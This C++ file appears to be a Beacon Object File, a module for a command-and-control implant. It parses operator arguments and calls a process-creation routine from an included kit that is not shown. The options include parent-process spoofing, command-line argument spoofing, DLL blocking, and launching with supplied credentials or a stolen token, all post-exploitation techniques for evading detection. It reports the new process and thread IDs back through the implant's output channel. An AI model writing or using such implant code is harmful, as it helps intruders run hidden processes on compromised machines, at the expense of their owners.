#include "../kit/kit_process_creation.cc"

extern "C" auto go( int argc, char* args ) -> void {
    datap data_parser = { 0 };

    BeaconDataParse( &data_parser, args, argc );

    // parse bof args
    auto process_method   = (Create)BeaconDataInt( &data_parser );
    auto process_blockdlls = BeaconDataInt( &data_parser );
    auto process_ppid      = BeaconDataInt( &data_parser );
    auto process_spoofarg  = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    
    auto process_argument = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    auto process_state    = BeaconDataInt( &data_parser );
    auto process_pipe     = BeaconDataInt( &data_parser );

    auto process_domain   = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    auto process_username = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    auto process_password = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );

    auto process_token = (HANDLE)BeaconDataInt( &data_parser );

    PS_CREATE_ARGS      create_args    = {};
    PROCESS_INFORMATION ps_information = {};

    create_args.method   = process_method;
    create_args.argument = process_argument;
    create_args.state    = process_state;
    create_args.pipe     = process_pipe;

    create_args.blockdlls = process_blockdlls;
    create_args.ppid      = process_ppid;
    create_args.spoofarg  = process_spoofarg;

    create_args.domain   = process_domain;
    create_args.username = process_username;
    create_args.password = process_password;

    if ( ! kh_process_creation( &create_args, &ps_information ) ) {
        BeaconPrintfW( CALLBACK_OUTPUT, L"Process creation failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return;
    }

    BeaconPrintfW( CALLBACK_OUTPUT, L"Process created with pid %d and tid: %d", ps_information.dwProcessId, ps_information.dwThreadId );

    return;
}
